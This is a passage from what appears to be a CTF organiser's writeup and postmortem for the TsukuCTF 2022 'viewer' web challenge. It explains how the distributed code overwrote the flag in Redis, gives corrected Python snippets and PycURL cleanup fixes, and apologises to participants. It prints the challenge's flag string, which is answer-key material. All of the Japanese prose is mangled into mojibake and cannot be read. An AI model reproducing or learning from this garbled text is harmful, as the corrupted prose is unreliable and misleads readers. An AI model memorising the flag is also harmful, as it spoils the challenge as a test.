</span><span>redis</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#cc99cd">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> json</span><span class="token token" style="color:#ccc">.</span><span>dumps</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;id&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> flag</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>ã“ã‚Œã«ã‚ˆã‚Šã€UUIDv4 ã‚’ ID ã¨ã—ãŸ Flag ã‚’å«ã‚€ãƒ‡ãƒ¼ã‚¿ãŒ Redis ã«ç™»éŒ²ã•ã‚Œã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆç™»éŒ²ã®éƒ¨åˆ†ã«ã¦ä»¥ä¸‹ã®é€šã‚Šãã® ID ã«å¯¾ã—ã¦ä¸Šæ›¸ããŒè¡Œã‚ã‚Œã¾ã™ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>    redis</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#cc99cd">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> json</span><span class="token token" style="color:#ccc">.</span><span>dumps</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;id&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">(</span><span>uuid</span><span class="token token" style="color:#ccc">.</span><span>uuid4</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> name</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    redis</span><span class="token token" style="color:#ccc">.</span><span>expire</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">100</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>ãã®çµæœã€Redis ã«ç™»éŒ²ã•ã‚ŒãŸ Flag ãŒåå‰ã§ä¸Šæ›¸ãã•ã‚Œã¦ã—ã¾ã„ã¾ã™ã€‚</p>
<p>è©³ã—ãã¯<a href="https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved">mopi ã•ã‚“ã®ãƒ–ãƒ­ã‚°</a>ã«ã¦æ¤œè¨¼ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã”è¦§ãã ã•ã„ã€‚æ¤œè¨¼ã¾ã§ãƒ–ãƒ­ã‚°ã«æ²è¼‰ã—ã¦ãã ã•ã£ãŸ mopi ã•ã‚“ã€ã‚ã‚ŠãŒã¨ã†ã”ã–ã„ã¾ã—ãŸ ğŸ™</p>
<hr/>
<p>ä¸€æ–¹ã€ä»¥ä¸‹ãŒæœ¬ç•ªç’°å¢ƒã®ã‚³ãƒ¼ãƒ‰ã§ Flag ã‚’ Redis ã«è¿½åŠ ã™ã‚‹éƒ¨åˆ†ã®ã‚³ãƒ¼ãƒ‰ã§ã™ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token token" style="color:#999"># user session information</span><span>
</span><span>redis </span><span class="token token" style="color:#67cdcc">=</span><span> redis</span><span class="token token" style="color:#ccc">.</span><span>Redis</span><span class="token token" style="color:#ccc">(</span><span>host</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#7ec699">&#x27;redis&#x27;</span><span class="token token" style="color:#ccc">,</span><span> port</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">6379</span><span class="token token" style="color:#ccc">,</span><span> db</span><span class="token token" style="color:#67cdcc">=</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>users </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#7ec699">&#x27;frt&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;ny_a&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;satoki&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;shio&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;taisyo&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;task&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;TsukuCTF22{ur1_scheme_1s_u5efu1}&quot;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;toto&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;xryuseix&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;y-chan&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;yu1k&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;yoshimi&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;ling&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;momoka&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;taru&#x27;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&#x27;imino&#x27;</span><span class="token token" style="color:#ccc">]</span><span>
</span><span></span><span class="token token" style="color:#cc99cd">for</span><span> user </span><span class="token token" style="color:#cc99cd">in</span><span> users</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>    </span><span class="token token" style="color:#cc99cd">id</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">(</span><span>uuid</span><span class="token token" style="color:#ccc">.</span><span>uuid4</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    redis</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#cc99cd">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> json</span><span class="token token" style="color:#ccc">.</span><span>dumps</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;id&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> user</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p><code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">id</code> ã¯ãƒ«ãƒ¼ãƒ—ã§ã‚¤ãƒ†ãƒ¬ãƒ¼ãƒˆã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€<code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">id</code>ãŒå¤‰æ›´ã•ã‚Œã‚‹ã®ã¯æœ€å¾Œã®ãƒ¦ãƒ¼ã‚¶ã®ã¿ã«ãªã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€æœ¬ç•ªç’°å¢ƒã§ã¯ Flag ã®ä¸Šæ›¸ããŒç™ºç”Ÿã—ã¾ã›ã‚“ã§ã—ãŸã€‚</p>
<h3>æ ¹æœ¬åŸå› </h3>
<p><strong>æ ¹æœ¬åŸå› ã¯ãƒ¦ãƒ¼ã‚¶ç™»éŒ²ã‚’è¡Œã† id ç”¨ã® UUIDv4 ã‚’å†ç”Ÿæˆã—ã¦ã„ãªã‹ã£ãŸã“ã¨</strong> ã«ã‚ã‚Šã¾ã™ã€‚ãã®å½±éŸ¿ã§ã€é…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã§æ§‹ç¯‰ã•ã‚Œã‚‹ç’°å¢ƒã§ã¯ã€Redis ã«è¿½åŠ ã•ã‚ŒãŸ Flag ãŒä¸Šæ›¸ãã•ã‚Œã¦ã—ã¾ã„å–å¾—ã™ã‚‹ã“ã¨ãŒä¸å¯èƒ½ã«ãªã‚Šã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ä¸Šè¨˜ã®é€šã‚Šã€<strong>æœ¬ç•ªç’°å¢ƒã§ã¯ Redis ã«ãƒ€ãƒŸãƒ¼ãƒ‡ãƒ¼ã‚¿ã‚’å«ã‚ã¦ Flag ã‚’æŒ¿å…¥ã—ã¦ã„ãŸãŸã‚ã«ã€Flag ãŒä¸Šæ›¸ãã•ã‚Œãšã«å–å¾—ã§ãã¦ã„ã¾ã—ãŸ</strong>ã€‚ã“ã®å·®ç•°ã¯ä½œå•æ™‚ã‹ã‚‰å«ã¾ã‚Œã¦ã„ã¾ã—ãŸãŒã€ä½œå•æ™‚ã«ã¯ä½œå•æ–¹é‡ã¨è§£æ³•ã®æµã‚Œã®ã¿ãŒãƒ¬ãƒ“ãƒ¥ãƒ¼ã•ã‚Œã¦ã„ãŸãŸã‚ã«ã€ã“ã®å•é¡Œã«æ°—ã¥ã‘ã¾ã›ã‚“ã§ã—ãŸã€‚</p>
<p>ã¾ãŸã€æœ¬ç•ªä¸­ã¯ç´„ 1 æ™‚é–“ã”ã¨ã« 1 å›ã‚½ãƒ«ãƒã‚’å›ã—ã¦ Flag ãŒå¾—ã‚‰ã‚Œã‚‹ã“ã¨ã®ã¿ã‚’ç¢ºèªã—ã¦ã„ãŸãŸã‚ã«ã€é…å¸ƒãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯æ°—ã‚’é…ã‚Œã¦ã„ã¾ã›ã‚“ã§ã—ãŸã€‚</p>
<h3>è§£æ±º</h3>
<p>ä»¥ä¸‹ã®é€šã‚Š <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">id</code> ã‚’ç”Ÿæˆã—ã¦ã‹ã‚‰ç™»éŒ²ã™ã‚‹ã“ã¨ã§ã€æ­£ã—ã„å®Ÿè£…ã«ãªã‚Šã¾ã™ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>    </span><span class="token token" style="color:#cc99cd">id</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> uuid</span><span class="token token" style="color:#ccc">.</span><span>uuid4</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    redis</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#cc99cd">set</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> json</span><span class="token token" style="color:#ccc">.</span><span>dumps</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">{</span><span class="token token" style="color:#7ec699">&quot;id&quot;</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">str</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#7ec699">&quot;name&quot;</span><span class="token token" style="color:#ccc">:</span><span> name</span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>    redis</span><span class="token token" style="color:#ccc">.</span><span>expire</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#cc99cd">id</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">100</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<h3>å½±éŸ¿</h3>
<p>å½±éŸ¿ã‚’å—ã‘ãŸãƒ¦ãƒ¼ã‚¶ã¯å…¨ãƒ¦ãƒ¼ã‚¶ã§ã™ã€‚ä¸€å¿œã€æœ¬ä»¶ã«é–¢ã—ã¦è¨€åŠã—ã¦ãã ã•ã£ãŸãƒ–ãƒ­ã‚°ã‚„ãƒ„ã‚¤ãƒ¼ãƒˆã‚’è¼‰ã›ã¦ãŠãã¾ã™ã€‚</p>
<ul>
<li><a href="https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved">TsukuCTF 2022 Writeup</a></li>
<li><a href="https://twitter.com/zeosutt/status/1584214650853683200">ãƒ„ã‚¤ãƒ¼ãƒˆ 1</a></li>
<li><a href="https://twitter.com/shinobe179/status/1584574685718585344">ãƒ„ã‚¤ãƒ¼ãƒˆ 2</a></li>
</ul>
<h3>å¯¾å¿œè€…</h3>
<p>å•é¡ŒãŒç™ºè¦šã—ãŸã®ã¯ CTF çµ‚äº†å¾Œã ã£ãŸãŸã‚ã€æœ¬ç•ªä¸­ã®å¯¾å¿œè€…ã¯ã„ã¾ã›ã‚“ã€‚</p>
<h3>è¿½è¨˜</h3>
<p>å®Ÿè£…ã«é–¢ã—ã¦ã€ä»–ã«ã‚‚ä¿®æ­£ã™ã¹ãç‚¹ãŒã„ãã¤ã‹ã‚ã£ãŸã®ã§ä»¥ä¸‹ã«è¨˜è¼‰ã—ã¦ãŠãã¾ã™ã€‚</p>
<p><strong>Exception ãŒèµ·ããŸæ™‚ã« PycURL ã®ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ãŒ close ã•ã‚Œãªã„</strong></p>
<p>é…å¸ƒãƒ•ã‚¡ã‚¤ãƒ«ã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã£ã¦ãŠã‚Šã€PycURL ã§ <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">c.perform()</code> å®Ÿè¡Œæ™‚ã« Exception ãŒç™ºç”Ÿã—ãŸå ´åˆã¯ <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">c.close()</code> ãŒå‘¼ã°ã‚Œã¾ã›ã‚“ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>        buf </span><span class="token token" style="color:#67cdcc">=</span><span> BytesIO</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">try</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            c </span><span class="token token" style="color:#67cdcc">=</span><span> pycurl</span><span class="token token" style="color:#ccc">.</span><span>Curl</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>setopt</span><span class="token token" style="color:#ccc">(</span><span>c</span><span class="token token" style="color:#ccc">.</span><span>URL</span><span class="token token" style="color:#ccc">,</span><span> url</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>setopt</span><span class="token token" style="color:#ccc">(</span><span>c</span><span class="token token" style="color:#ccc">.</span><span>WRITEDATA</span><span class="token token" style="color:#ccc">,</span><span> buf</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>perform</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>close</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>            body </span><span class="token token" style="color:#67cdcc">=</span><span> buf</span><span class="token token" style="color:#ccc">.</span><span>getvalue</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span>decode</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&#x27;utf-8&#x27;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">except</span><span> Exception </span><span class="token token" style="color:#cc99cd">as</span><span> e</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            traceback</span><span class="token token" style="color:#ccc">.</span><span>print_exc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            abort</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;error occurs&quot;</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p>ã—ãŸãŒã£ã¦ã€ä»¥ä¸‹ã®é€šã‚Š <code class="undefined MarkdownRender_inlineCode__5ZUcq" node="[object Object]">finally</code> å¥ã‚’åˆ©ç”¨ã™ã‚‹ã¹ãã§ã™ã€‚</p>
<pre><div node="[object Object]" class="MarkdownRender_code__r6Sqc" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-python" style="color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span>        buf </span><span class="token token" style="color:#67cdcc">=</span><span> BytesIO</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        c </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">None</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">try</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            c </span><span class="token token" style="color:#67cdcc">=</span><span> pycurl</span><span class="token token" style="color:#ccc">.</span><span>Curl</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>setopt</span><span class="token token" style="color:#ccc">(</span><span>c</span><span class="token token" style="color:#ccc">.</span><span>URL</span><span class="token token" style="color:#ccc">,</span><span> url</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>setopt</span><span class="token token" style="color:#ccc">(</span><span>c</span><span class="token token" style="color:#ccc">.</span><span>WRITEDATA</span><span class="token token" style="color:#ccc">,</span><span> buf</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>perform</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span>
<span>            body </span><span class="token token" style="color:#67cdcc">=</span><span> buf</span><span class="token token" style="color:#ccc">.</span><span>getvalue</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">.</span><span>decode</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&#x27;utf-8&#x27;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">except</span><span> Exception </span><span class="token token" style="color:#cc99cd">as</span><span> e</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            traceback</span><span class="token token" style="color:#ccc">.</span><span>print_exc</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>            abort</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#7ec699">&quot;error occurs&quot;</span><span class="token token" style="color:#ccc">)</span><span>
</span><span>        </span><span class="token token" style="color:#cc99cd">finally</span><span class="token token" style="color:#ccc">:</span><span>
</span><span>            c</span><span class="token token" style="color:#ccc">.</span><span>close</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span></code></div></pre>
<p><strong>PycURL ã®ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆãŒè¨­ã‘ã‚‰ã‚Œã¦ã„ãªã„</strong></p>
<p>PycURL ã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ 300[s]ã®ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã‚’æŒã£ã¦ã„ã¾ã™ãŒã€ä»Šå›ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è¦ä»¶ã«ã¯é•·ã™ãã§ã™ã€‚ä»Šå›ã®å•é¡Œã§ã¯å¾—ã‚‰ã‚ŒãŸ Redis ã® key ã«å¯¾ã—ã¦å…¨æ¢ç´¢ã‚’è¡Œã†å¿…è¦ãŒã‚ã‚Šã€ã‚³ãƒã‚¯ã‚·ãƒ§ãƒ³ãŒé›†ä¸­ã™ã‚‹ã“ã¨ã¯å®¹æ˜“ã«æƒ³å®šã§ãã‚‹ãŸã‚ã€ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆã¯ 10[s]ãã‚‰ã„ã«è¨­å®šã—ã¦ãŠã„ã¦ã‚‚è‰¯ã‹ã£ãŸã®ã§ã¯ãªã„ã‹ã¨æ€ã„ã¾ã—ãŸã€‚</p>
<h3>ãŠã‚ã‚Šã«</h3>
<p>ã“ã®åº¦ã¯ã€ä½œå•è€…ã®å®Ÿè£…ä¸å‚™ã«ã‚ˆã£ã¦ã€å‚åŠ è€…ä½“é¨“ã‚’æ‚ªãã—ã¦ã—ã¾ã£ãŸã“ã¨ã‚’æ·±ããŠè©«ã³ç”³ã—ä¸Šã’ã¾ã™ã€‚
ä»Šå¾Œã¯ãƒ¬ãƒ“ãƒ¥ãƒ¼æ™‚ã«è§£æ³•ã®æ–¹é‡ã‚„ãƒ•ãƒ©ã‚°ãƒã‚§ãƒƒã‚¯ç”¨ã®ã‚½ãƒ«ãƒã ã‘ã§ãªãã€é…å¸ƒãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚‚æ°—ã‚’é…ã£ã¦ãƒ¬ãƒ“ãƒ¥ãƒ¼ã™ã‚‹äºˆå®šã§ã™ã€‚</p>
<p>ã¾ãŸã€ä»–ã®å‚åŠ è€…ã‚‚å«ã‚ãŸã‚ˆã‚Šè‰¯ã„ CTF ä½“é¨“ã®ãŸã‚ã«ã€Discord ã§ã®#ask-to-admin ã«ã¦ãŠå•ã„åˆã‚ã›ã„ãŸã ããªã©ã®ã”å”åŠ›ã‚’ãŠé¡˜ã„ã„ãŸã—ã¾ã™ã€‚</p>
<h2>å‚è€ƒè³‡æ–™</h2>
<ul>
<li><a href="https://ueokande.github.io/incident-response-docs-ja/after/post_mortem_template/">ãƒã‚¹ãƒˆãƒ¢ãƒ¼ãƒ†ãƒ ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ - PagerDuty</a></li>
</ul></div><div class="Footer_footer__WOAaR">Â© 2021-<!-- -->2022<!-- --> SecHack365-Fans All Right Reserved.</div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"viewer","contentHtml":"# viewer\n\n## ã¯ã˜ã‚ã«\n\næœ¬å•é¡Œã§é…å¸ƒã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ã®ä¸€éƒ¨ã«å®Ÿè£…ä¸å‚™ãŒã‚ã‚Šå‚åŠ è€…ä½“é¨“ã‚’æ‚ªãã—ã¦ã—ã¾ã£ãŸã“ã¨ã‚’ã€CTF çµ‚äº†å¾Œã«å¹¾ã¤ã‹ã®ãƒ–ãƒ­ã‚°è¨˜äº‹ã‚„ãƒ„ã‚¤ãƒ¼ãƒˆã‹ã‚‰çŸ¥ã‚Šã¾ã—ãŸã€‚ã“ã®ä»¶ã«é–¢ã—ã¦ã€ä¸‡å…¨ã®å•é¡Œæä¾›ãŒã§ããªã‹ã£ãŸã“ã¨ã‚’ãŠè©«ã³ç”³ã—ä¸Šã’ã¾ã™ã€‚\n\nå†ç™ºé˜²æ­¢ã®ãŸã‚ã«é…å¸ƒã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã¨æœ¬ç•ªç’°å¢ƒã®ã‚³ãƒ¼ãƒ‰ã«å·®ç•°ã‚’ç”Ÿã¾ãªã„ã‚ˆã†ãƒ¬ãƒ“ãƒ¥ãƒ¼æ®µéšã§æ³¨æ„ã™ã‚‹äºˆå®šã§ã™ã€‚ãã—ã¦ã€å‚åŠ è€…ã®çš†æ§˜ã«ã¨ã£ã¦ã‚ˆã‚Šè‰¯ã„ CTF ã«ã™ã‚‹ãŸã‚ã«ã‚‚ã€ä¸å¯©ãªç‚¹ãªã©ãŒã‚ã‚Œã° Discord ã®#ask-to-admin ã§ã”ç¢ºèªã„ãŸã ã‘ã‚‹ã¨éå¸¸ã«ã‚ã‚ŠãŒãŸã„ã§ã™ã€‚ã‚ˆã‚ã—ããŠé¡˜ã„ã—ã¾ã™ã€‚\n\nã¾ãŸã€ã“ã‚Œã«ä¼´ã„ç°¡å˜ãªãƒã‚¹ãƒˆãƒ¢ãƒ¼ãƒ†ãƒ ã‚’è¡Œã£ãŸãŸã‚ Writeup æœ«å°¾ã«è¿½è¨˜ã—ã¾ã™ã€‚æœ¬ä»¶ã«èˆˆå‘³ãŒã‚ã‚‹æ–¹ã¯ã”è¦§ãã ã•ã„ã€‚\n\n## å•é¡Œæ–‡\n\nWriteups for TsukuCTF21 have been published.\nCheck them out if you'd 